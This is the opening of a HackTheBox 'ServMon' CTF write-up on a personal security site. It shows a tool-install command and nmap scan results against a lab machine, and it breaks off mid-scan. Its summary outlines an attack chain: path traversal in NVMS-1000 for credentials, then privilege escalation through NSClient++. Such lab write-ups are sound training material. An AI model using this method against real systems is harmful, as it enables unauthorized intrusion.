<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/ServMon/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">ServMon | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/ServMon/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="ServMon | CyFun"><meta data-rh="true" name="description" content="ðŸ’¢ Info"><meta data-rh="true" property="og:description" content="ðŸ’¢ Info"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/ServMon/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/ServMon/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/ServMon/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon </a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">ServMon</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">ServMon </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>ServMon </h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="-info">ðŸ’¢ Info<a href="#-info" class="hash-link" aria-label="Direct link to ðŸ’¢ Info" title="Direct link to ðŸ’¢ Info">â€‹</a></h2><h1></h1><ul><li><strong>Name:</strong> ServMon</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/240" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 20</li></ul><p><img loading="lazy" alt="servmon" src="/assets/images/servmon-bb4a057679248f0d4b806c4238af7b60.png" width="598" height="381" class="img_ev3q"></p><h1></h1><h3 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">â€‹</a></h3><p><strong>TL;DR</strong>: We have to find some hints in a FTP, finds creds through a Path
Traversal in NVMS-1000 and gain a low privilege shell, then we pe via
NSClient++ to get admin RCE.</p><p>Install tools used in this WU on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo pacman -S nmap   exploitdb smbclient filezilla dos2unix curl metasploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network Enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network Enumeration" title="Direct link to Network Enumeration">â€‹</a></h3><p>Let&#x27;s start with a <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a> scan to find open ports and identify services:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo nmap -sSVC -p- 10.10.10.184 -oA nmap_full</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 15:56 CEST</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.184</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.020s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65517 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT      STATE SERVICE       VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">21/tcp    open  ftp           Microsoft ftpd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_01-18-20  12:05PM       &lt;DIR&gt;          Users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ftp-syst:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  SYST: Windows_NT</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp    open  http</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| fingerprint-strings:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   GetRequest, HTTPOptions, RTSPRequest:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     HTTP/1.1 200 OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Content-type: text/html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Content-Length: 340</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Connection: close</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     AuthInfo:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;head&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;title&gt;&lt;/title&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;script type=&quot;text/javascript&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     window.location.href = &quot;Pages/login.htm&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;/script&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;/head&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;body&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;/body&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;/html&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   NULL:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     HTTP/1.1 408 Request Timeout</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Content-type: text/html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Content-Length: 0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Connection: close</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    AuthInfo:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">135/tcp   open  msrpc         Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">445/tcp   open  microsoft-ds?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5040/tcp  open  unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5666/tcp  open  tcpwrapped</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6063/tcp  open  x11?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6699/tcp  open  